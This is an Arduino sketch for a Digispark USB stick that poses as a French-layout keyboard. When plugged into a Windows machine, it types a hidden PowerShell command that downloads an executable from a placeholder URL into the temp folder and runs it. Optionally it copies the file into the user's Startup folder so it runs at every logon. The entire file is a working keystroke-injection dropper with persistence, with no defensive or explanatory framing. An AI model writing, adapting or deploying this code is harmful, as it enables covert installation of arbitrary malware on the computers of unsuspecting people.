#include "DigiKeyboardFr.h"

#define URL "http://example.fr/bin.exe"
#define EXE_FILENAME "tmp.exe"
#define STARTUP

const short time_default = 500;
const short time_run = 2000;
const char led_id = 1;

void setup() {
  pinMode(led_id, OUTPUT);
}

void loop() {
  digitalWrite(led_id, LOW);
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.println("powershell");
  DigiKeyboardFr.delay(time_run);
  DigiKeyboardFr.println("mode con cols=18 lines=1;");
  DigiKeyboardFr.print("cd $Env:Temp; wget "URL" -OutFile "EXE_FILENAME";Invoke-Item "EXE_FILENAME";");
  #ifdef STARTUP
  DigiKeyboardFr.print("copy "EXE_FILENAME" \"$Env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\";");
  #endif
  DigiKeyboardFr.println("exit");
  digitalWrite(led_id, HIGH);
  for (;;) {
  }
}
